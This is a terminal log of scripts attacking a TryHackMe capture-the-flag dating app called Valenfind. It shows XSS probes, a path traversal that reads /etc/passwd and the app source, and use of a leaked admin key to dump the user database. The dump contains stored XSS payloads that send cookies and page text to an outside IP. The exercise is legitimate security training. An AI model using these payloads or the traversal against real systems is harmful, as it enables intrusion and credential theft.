
(.venv) PS D:\projects\tryhackme> python owasp_hunt\_check_render.py
=== /profile/test_jvzs raw HTML ===

  [NAME] NOT FOUND in profile page

  [ADDR] NOT FOUND in profile page

  [BIO] raw_html=False, escaped=True
  context: ...hen(r => r.text())
            .then(html => {
                const bioText = "MARKER_BIO_&lt;b&gt;bold&lt;/b&gt;_END";
                const username = "test_jvzs";
                
                ...

=== /my_profile raw HTML ===

  [NAME] raw_html=False, escaped=True
  context: ...bel><b>Real Name</b></label>
        <input type="text" name="real_name" value="MARKER_NAME_&lt;b&gt;bold&lt;/b&gt;_END" required>

        <label><b>Email Address</b></label>
        <input type="ema...

  [ADDR] raw_html=False, escaped=True
  context: ...><b>Home Address</b></label>
        <textarea name="address" rows="2" required>MARKER_ADDR_&lt;b&gt;bold&lt;/b&gt;_END</textarea>

        <label><b>Bio / About Me</b></label>
        <textarea name=...

  [BIO] raw_html=False, escaped=True
  context: ...el><b>Bio / About Me</b></label>
        <textarea name="bio" rows="3" required>MARKER_BIO_&lt;b&gt;bold&lt;/b&gt;_END</textarea>

        <button type="submit" class="btn" style="width: 100%; margin-...

=== Try seeding via /my_profile POST ===


  [ADDR] NOT FOUND

  [BIO] raw_html=False, escaped=True
  context: ...hen(r => r.text())
            .then(html => {
                const bioText = "MARKER2_BIO_&lt;b&gt;bold2&lt;/b&gt;_END";
                const username = "test_jvzs";
                
              ...

Username: test_jvzs
(.venv) PS D:\projects\tryhackme> python owasp_hunt\_check_js_inject.py
[Test 1] Quote break test:
  bioText = "AAA&#34;;var x=1;//BBB";
                const username = "jstest_hszc";
                
                // Client-side rendering of the fetched template
                let rendered = htm
  --> Other escaping

[Test 2] Backslash bypass test:
  bioText = "AAA\&#34;;var y=2;//BBB";
                const username = "jstest_hszc";
                
                // Client-side rendering of the fetched template
                let rendered = ht

[Test 3] Payload: 'AAA`+alert(1)+`BBB'
  bioText = "AAA`+alert(1)+`BBB";
                const username = "jstest_hszc";
                
                // Client-side rendering of the fetched template
                let rendered = html.re

[Test 4] Payload: 'AAA</script><script>alert(1)</script>'
  bioText = "AAA&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;";
                const username = "jstest_hszc";
                
                // Client-side rendering of the fetched template
 

[Test 5] Payload: 'AAA</script>'
  bioText = "AAA&lt;/script&gt;";
                const username = "jstest_hszc";
                
                // Client-side rendering of the fetched template
                let rendered = html.re

[Test 6] Payload: "AAA'-alert(1)-'BBB"
  bioText = "AAA&#39;-alert(1)-&#39;BBB";
                const username = "jstest_hszc";
                
                // Client-side rendering of the fetched template
                let rendered =

=== Full script context ===
<script>
    // Initial load
    document.addEventListener("DOMContentLoaded", function() {
        loadTheme('theme_classic.html');
    });

    function loadTheme(layoutName) {
        // Feature: Dynamic Layout Fetching
        fetch(`/api/fetch_layout?layout=${layoutName}`)
            .then(r => r.text())
            .then(html => {
                const bioText = "AAA&#39;-alert(1)-&#39;BBB";
                const username = "jstest_hszc";
                
                // Client-side rendering of the fetched template
                                   .replace('__BIO__', bioText);
                
                document.getElementById('bio-container').innerHTML = rendered;
            })
            .catch(e => {
                console.error(e);
                document.getElementById('bio-container').innerText = "Error loading theme.";
            });
    }
</script>

Username: jstest_hszc
(.venv) PS D:\projects\tryhackme> python owasp_hunt\_check_layout.py
=== /api/fetch_layout?layout=theme_classic.html ===
Status: 200, Length: 510

        <div class="bio-box" style="
            background: #ffffff; 
            border: 1px solid #e1e1e1; 
            padding: 20px; 
            border-radius: 12px; 
            box-shadow: 0 4px 6px rgba(0,0,0,0.05); 
            text-align: left;">
            <h3 style="color: #2c3e50; border-bottom: 2px solid #ff4757; padding-bottom: 10px; display: inline-block;">__USERNAME__</h3>
            <p style="color: #7f8c8d; font-style: italic; line-height: 1.6;">"__BIO__"</p>
        </div>
        
...
div class="bio-box" style="
            background: #ffffff; 
            border: 1px solid #e1e1e1; 
            padding: 20px; 
            border-radius: 12px; 
            box-shadow: 0 4px 6px rgba(0,0,0,0.05); 
            text-align: left;">
            <h3 style="color: #2c3e50; border-bottom: 2px solid #ff4757; padding-bottom: 10px; display: inline-block;">__USERNAME__</h3>
            <p style="color: #7f8c8d; font-style: italic; line-height: 1.6;">"__BIO__"</p>
        </div>
        

=== Path Traversal Tests ===
  layout=../../../etc/passwd -> 200 (122 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../../etc/passwd'
  layout=....//....//....//etc/passwd -> 200 (131 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/....//....//....//etc/passwd'
  layout=..%2f..%2f..%2fetc%2fpasswd -> 200 (122 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../../etc/passwd'
  layout=../../../../etc/passwd -> 200 (2021 bytes) *** INTERESTING ***
    root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin
  layout=../app.py -> 200 (112 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../app.py'
  layout=../../app.py -> 200 (10187 bytes) *** INTERESTING ***
    import os
import sqlite3
import hashlib
from flask import Flask, render_template, request, redirect, url_for, session, send_file, g, flash, jsonify
from seeder import INITIAL_USERS

app = Flask(__name__)
app.secret_key = os.urandom(24)

ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appc
  layout=../../../app.py -> 200 (118 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../../app.py'
  layout=../flag.txt -> 200 (114 bytes) *** INTERESTING ***
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../flag.txt'
  layout=../../flag.txt -> 200 (117 bytes) *** INTERESTING ***
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../flag.txt'
  layout=../../../flag.txt -> 200 (120 bytes) *** INTERESTING ***
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../../flag.txt'
  layout=../templates/admin.html -> 200 (126 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../templates/admin.html'
  layout=../../templates/admin.html -> 200 (129 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../templates/admin.html'
  layout=../config.py -> 200 (115 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../config.py'
  layout=../../config.py -> 200 (118 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../config.py'
  layout=../secret.txt -> 200 (116 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../secret.txt'
  layout=../../secret.txt -> 200 (119 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../secret.txt'
  layout=../.env -> 200 (110 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../.env'
  layout=../../.env -> 200 (113 bytes)
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../.env'
  layout=flag -> 200 (107 bytes) *** INTERESTING ***
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/flag'
  layout=flag.txt -> 200 (111 bytes) *** INTERESTING ***
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/flag.txt'
  layout=flag.html -> 200 (112 bytes) *** INTERESTING ***
    Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/flag.html'

=== Theme enumeration ===
  theme_classic.html -> 200 (510 bytes) |          <div class="bio-box" style="             background: #ffffff;              border: 1px soli  theme_modern.html -> 200 (586 bytes) |          <div class="bio-box modern" style="             background: #2f3542;              color: #d
  theme_dark.html -> 200 (118 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  theme_valentine.html -> 200 (123 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  theme_cupid.html -> 200 (119 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  theme_admin.html -> 200 (119 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  theme_flag.html -> 200 (118 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  index.html -> 200 (113 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  base.html -> 200 (112 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  admin.html -> 200 (113 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  login.html -> 200 (113 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  register.html -> 200 (116 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  dashboard.html -> 200 (117 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  flag.html -> 200 (112 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component
  secret.html -> 200 (114 bytes) | Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/component

=== __BIO__ context in theme template ===
  __BIO__ at char 474:
    ...k;">__USERNAME__</h3>
            <p style="color: #7f8c8d; font-style: italic; line-height: 1.6;">"__BIO__"</p>
        </div>
        ...
  __USERNAME__ at char 378:
    ...le="color: #2c3e50; border-bottom: 2px solid #ff4757; padding-bottom: 10px; display: inline-block;">__USERNAME__</h3>
            <p style="color: #7f8c8d; font-style: italic; line-height: 1.6;">"__BI...
(.venv) PS D:\projects\tryhackme> python owasp_hunt\_loot.py
============================================================
=== FULL app.py SOURCE CODE ===
============================================================
import os
import sqlite3
import hashlib
from flask import Flask, render_template, request, redirect, url_for, session, send_file, g, flash, jsonify
from seeder import INITIAL_USERS

app = Flask(__name__)
app.secret_key = os.urandom(24)

ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    if not os.path.exists(DATABASE):
        with app.app_context():
            db = get_db()
            cursor = db.cursor()
            
            cursor.execute('''
                CREATE TABLE users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL UNIQUE,
                    password TEXT NOT NULL,
                    real_name TEXT,
                    email TEXT,
                    phone_number TEXT,
                    address TEXT,
                    bio TEXT,
                    likes INTEGER DEFAULT 0,
                    avatar_image TEXT
                )
            ''')
            
            cursor.executemany('INSERT INTO users (username, password, real_name, email, phone_number, address, bio, likes, avatar_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', INITIAL_USERS)
            db.commit()
            print("Database initialized successfully.")

@app.template_filter('avatar_color')
def avatar_color(username):
    hash_object = hashlib.md5(username.encode())
    return '#' + hash_object.hexdigest()[:6]

# --- ROUTES ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        try:
            cursor = db.cursor()
            cursor.execute('INSERT INTO users (username, password, bio, real_name, email, avatar_image) VALUES (?, ?, ?, ?, ?, ?)', 
                       (username, password, "New to ValenFind!", "", "", "default.jpg"))
            db.commit()
            
            user_id = cursor.lastrowid
            session['user_id'] = user_id
            session['username'] = username
            session['liked'] = []
            
            flash("Account created! Please complete your profile.")
            return redirect(url_for('complete_profile'))
            
        except sqlite3.IntegrityError:
            return render_template('register.html', error="Username already taken.")
    return render_template('register.html')

@app.route('/complete_profile', methods=['GET', 'POST'])
def complete_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    if request.method == 'POST':
        real_name = request.form['real_name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        bio = request.form['bio']
        
        db = get_db()
        db.execute('''
            UPDATE users 
            SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ?
            WHERE id = ?
        ''', (real_name, email, phone, address, bio, session['user_id']))
        db.commit()
        
        flash("Profile setup complete! Time to find your match.")
        return redirect(url_for('dashboard'))
        
    return render_template('complete_profile.html')

@app.route('/my_profile', methods=['GET', 'POST'])
def my_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    db = get_db()
    
    if request.method == 'POST':
        real_name = request.form['real_name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        bio = request.form['bio']
        
        db.execute('''
            UPDATE users 
            SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ?
            WHERE id = ?
        ''', (real_name, email, phone, address, bio, session['user_id']))
        db.commit()
        flash("Profile updated successfully! ✅")
        return redirect(url_for('my_profile'))
    
    user = db.execute('SELECT * FROM users WHERE id = ?', (session['user_id'],)).fetchone()
    return render_template('edit_profile.html', user=user)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        
        if user and user['password'] == password:
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['liked'] = [] 
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Invalid credentials.")
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    db = get_db()
    profiles = db.execute('SELECT id, username, likes, bio, avatar_image FROM users WHERE id != ?', (session['user_id'],)).fetchall()
    return render_template('dashboard.html', profiles=profiles, user=session['username'])

@app.route('/profile/<username>')
def profile(username):
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    db = get_db()
    profile_user = db.execute('SELECT id, username, bio, likes, avatar_image FROM users WHERE username = ?', (username,)).fetchone()
    
    if not profile_user:
        return "User not found", 404
        
    return render_template('profile.html', profile=profile_user)

@app.route('/api/fetch_layout')
def fetch_layout():
    layout_file = request.args.get('layout', 'theme_classic.html')
    
    if 'cupid.db' in layout_file or layout_file.endswith('.db'):
        return "Security Alert: Database file access is strictly prohibited."
    if 'seeder.py' in layout_file:
        return "Security Alert: Configuration file access is strictly prohibited."
    
    try:
        base_dir = os.path.join(os.getcwd(), 'templates', 'components')
        file_path = os.path.join(base_dir, layout_file)
        
        with open(file_path, 'r') as f:
            return f.read()
    except Exception as e:
        return f"Error loading theme layout: {str(e)}"

@app.route('/like/<int:user_id>', methods=['POST'])
def like_user(user_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if 'liked' not in session:
        session['liked'] = []
        
    if user_id in session['liked']:
        flash("You already liked this person! Don't be desperate. 😉")
        return redirect(request.referrer)

    db = get_db()
    db.execute('UPDATE users SET likes = likes + 1 WHERE id = ?', (user_id,))
    db.commit()
    
    session['liked'].append(user_id)
    session.modified = True
    
    flash("You sent a like! ❤️")
    return redirect(request.referrer)

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    session.pop('liked', None)
    return redirect(url_for('index'))

@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403

if __name__ == '__main__':
    if not os.path.exists('templates/components'):
        os.makedirs('templates/components')
    
    with open('templates/components/theme_classic.html', 'w') as f:
        f.write('''
        <div class="bio-box" style="
            background: #ffffff; 
            border: 1px solid #e1e1e1; 
            padding: 20px; 
            border-radius: 12px; 
            box-shadow: 0 4px 6px rgba(0,0,0,0.05); 
            text-align: left;">
            <h3 style="color: #2c3e50; border-bottom: 2px solid #ff4757; padding-bottom: 10px; display: inline-block;">__USERNAME__</h3>
            <p style="color: #7f8c8d; font-style: italic; line-height: 1.6;">"__BIO__"</p>
        </div>
        ''')
        
    with open('templates/components/theme_modern.html', 'w') as f:
        f.write('''
        <div class="bio-box modern" style="
            background: #2f3542; 
            color: #dfe4ea; 
            padding: 25px; 
            border-radius: 15px; 
            border-left: 5px solid #2ed573;
            font-family: 'Courier New', monospace;">
            <h3 style="color: #2ed573; text-transform: uppercase; letter-spacing: 2px; margin-top: 0;">__USERNAME__</h3>
            <p style="line-height: 1.5;">> __BIO__<span style="animation: blink 1s infinite;">_</span></p>
            <style>@keyframes blink { 50% { opacity: 0; } }</style>
        </div>
        ''')

    with open('templates/components/theme_romance.html', 'w') as f:
        f.write('''
        <div class="bio-box romance" style="
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%); 
            color: #c0392b; 
            padding: 30px; 
            border-radius: 50px 0 50px 0; 
            border: 2px dashed #ff6b81;
            text-align: center;">
            <div style="font-size: 2rem; margin-bottom: 10px;">💖 💘 💖</div>
            <h3 style="font-family: 'Brush Script MT', cursive; font-size: 2.5rem; margin: 10px 0;">__USERNAME__</h3>
            <p style="font-weight: bold; font-size: 1.1rem;">✨ __BIO__ ✨</p>
            <div style="font-size: 1.5rem; margin-top: 15px;">💌</div>
        </div>
        ''')

    init_db()
    app.run(debug=False, host='0.0.0.0', port=5000)


=== Searching for flags ===
============================================================

  [../../cupid.db] (60 bytes):
Security Alert: Database file access is strictly prohibited.

  [../../seeder.py] (65 bytes):
Security Alert: Configuration file access is strictly prohibited.

============================================================
=== Testing ADMIN_API_KEY ===
============================================================
(.venv) PS D:\projects\tryhackme> python owasp_hunt\_dump_db.py
[1] Downloading database via /api/admin/export_db
  Status: 200, Size: 24576 bytes
  Content-Type: application/octet-stream
  Saved to valenfind_leak.db

[2] Reading database
  Tables: ['users', 'sqlite_sequence']

  === users ===
  Columns: ['id', 'username', 'password', 'real_name', 'email', 'phone_number', 'address', 'bio', 'likes', 'avatar_image']
  {'id': 1, 'username': 'romeo_montague', 'password': 'juliet123', 'real_name': 'Romeo Montague', 'email': 'romeo@verona.cupid', 'phone_number': '555-0100-ROMEO', 'address': '123 Balcony Way, Verona, VR 99999', 'bio': 'Looking for my Juliet. Where art thou?', 'likes': 24, 'avatar_image': 'romeo.jpg'}
  {'id': 2, 'username': 'casanova_official', 'password': 'secret123', 'real_name': 'Giacomo Casanova', 'email': 'loverboy@venice.kiss', 'phone_number': '555-0155-LOVE', 'address': '101 Grand Canal St, Venice, Italy', 'bio': 'Just here for the free chocolate.', 'likes': 15, 'avatar_image': 'casanova.jpg'}
  {'id': 3, 'username': 'cleopatra_queen', 'password': 'caesar_salad', 'real_name': 'Cleopatra VII Philopator', 'email': 'queen@nile.river', 'phone_number': '555-0001-NILE', 'address': 'Royal Palace, Alexandria, Egypt', 'bio': "I rule an empire, but I can't rule my heart. 🐍", 'likes': 98, 'avatar_image': 'cleo.jpg'}
  {'id': 4, 'username': 'sherlock_h', 'password': 'watson_is_cool', 'real_name': 'Sherlock Holmes', 'email': 'detective@baker.street', 'phone_number': '555-221B-KEYS', 'address': '221B Baker Street, London, UK', 'bio': 'Observant, logical, and looking for a mystery to solve (or a date).', 'likes': 31, 'avatar_image': 'sherlock.jpg'}
  {'id': 5, 'username': 'gatsby_great', 'password': 'green_light', 'real_name': 'Jay Gatsby', 'email': 'jay@westegg.party', 'phone_number': '555-1922-RICH', 'address': 'Gatsby Mansion, West Egg, NY, USA', 'bio': "Throwing parties every weekend hoping you'll walk through the door.", 'likes': 115, 'avatar_image': 'gatsby.jpg'}
  {'id': 6, 'username': 'jane_eyre', 'password': 'rochester_blind', 'real_name': 'Jane Eyre', 'email': 'jane@thornfield.book', 'phone_number': '555-1847-READ', 'address': 'Thornfield Hall, Yorkshire, UK', 'bio': 'Quiet, independent, and looking for a connection of the soul.', 'likes': 43, 'avatar_image': 'jane.jpg'}
  {'id': 7, 'username': 'count_dracula', 'password': 'sunlight_sucks', 'real_name': 'Vlad Dracula', 'email': 'vlad@night.walker', 'phone_number': '555-0666-BITE', 'address': 'Bran Castle, Transylvania, Romania', 'bio': 'I love long walks at night and biting... necks? No, biting into life!', 'likes': 676, 'avatar_image': 'dracula.jpg'}
  {'id': 8, 'username': 'cupid', 'password': 'admin_root_x99', 'real_name': 'System Administrator', 'email': 'cupid@internal.cupid', 'phone_number': '555-0000-ROOT', 'address': 'FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}', 'bio': 'I keep the database secure. No peeking.', 'likes': 1012, 'avatar_image': 'cupid.jpg'}

  [FLAG] THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
  {'id': 9, 'username': '123', 'password': '123', 'real_name': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,300);(new Image).src=\'http://10.112.69.178:8888/steal?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)+\'&u=\'+encodeURIComponent(location.href)">', 'email': 'xss@test.com', 'phone_number': '123456789', 'address': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,300);(new Image).src=\'http://10.112.69.178:8888/steal?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)+\'&u=\'+encodeURIComponent(location.href)">', 'bio': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,300);(new Image).src=\'http://10.112.69.178:8888/steal?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)+\'&u=\'+encodeURIComponent(location.href)">', 'likes': 9, 'avatar_image': 'default.jpg'}
  {'id': 10, 'username': 'aaa', 'password': '123', 'real_name': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,300);(new Image).src=\'http://10.112.69.178:8888/steal?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)+\'&u=\'+encodeURIComponent(location.href)">', 'email': 'xss@test.com', 'phone_number': '123456789', 'address': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,300);(new Image).src=\'http://10.112.69.178:8888/steal?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)+\'&u=\'+encodeURIComponent(location.href)">', 'bio': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,300);(new Image).src=\'http://10.112.69.178:8888/steal?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)+\'&u=\'+encodeURIComponent(location.href)">', 'likes': 6, 'avatar_image': 'default.jpg'}
  {'id': 11, 'username': 'qqq', 'password': 'qqq', 'real_name': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,300);(new Image).src=\'http://10.112.69.178:8888/steal?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)+\'&u=\'+encodeURIComponent(location.href)">', 'email': 'xss@test.com', 'phone_number': '123456789', 'address': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,300);(new Image).src=\'http://10.112.69.178:8888/steal?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)+\'&u=\'+encodeURIComponent(location.href)">', 'bio': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,300);(new Image).src=\'http://10.112.69.178:8888/steal?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)+\'&u=\'+encodeURIComponent(location.href)">', 'likes': 4, 'avatar_image': 'default.jpg'}
  {'id': 12, 'username': 'pwn_xaxdns', 'password': 'Pwn12345!', 'real_name': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,500);new Image().src=\'http://10.112.69.178:8888/x?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)">', 'email': 'pwn@pwn.com', 'phone_number': '123456789', 'address': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,500);new Image().src=\'http://10.112.69.178:8888/x?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)">', 'bio': '<svg onload="var c=document.cookie||\'nocookie\';var t=(document.body?document.body.innerText:\'\').substring(0,500);new Image().src=\'http://10.112.69.178:8888/x?d=\'+encodeURIComponent(c)+\'&t=\'+encodeURIComponent(t)">', 'likes': 1, 'avatar_image': 'default.jpg'}
  {'id': 13, 'username': 'test_jvzs', 'password': 'Test1234!', 'real_name': 'MARKER2_NAME_<b>bold2</b>_END', 'email': 'test@test.com', 'phone_number': '123', 'address': 'MARKER2_ADDR_<b>bold2</b>_END', 'bio': 'MARKER2_BIO_<b>bold2</b>_END', 'likes': 0, 'avatar_image': 'default.jpg'}
  {'id': 14, 'username': 'jstest_hszc', 'password': 'Test1234!', 'real_name': 'Normal', 'email': 'test@test.com', 'phone_number': '123', 'address': 'Normal', 'bio': "AAA'-alert(1)-'BBB", 'likes': 0, 'avatar_image': 'default.jpg'}
  {'id': 15, 'username': 'vec_rtqf', 'password': 'Test1234!', 'real_name': '', 'email': '', 'phone_number': None, 'address': None, 'bio': 'New to ValenFind!', 'likes': 0, 'avatar_image': 'default.jpg'}
  {'id': 16, 'username': 'loot_mlkn', 'password': 'T1234!', 'real_name': '', 'email': '', 'phone_number': None, 'address': None, 'bio': 'New to ValenFind!', 'likes': 0, 'avatar_image': 'default.jpg'}

  === sqlite_sequence ===
  Columns: ['name', 'seq']
  {'name': 'users', 'seq': 16}

[3] Scanning raw DB for flags
  [FLAG] THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}

[4] Trying to read seeder.py
  [../../seeder%2Epy] -> Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind
  [../.././seeder.py] -> Security Alert: Configuration file access is strictly prohibited.
  [../../seeder.Py] -> Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind
  [../../SEEDER.PY] -> Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind
  [../../seeder.p%79] -> Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind
(.venv) PS D:\projects\tryhackme> 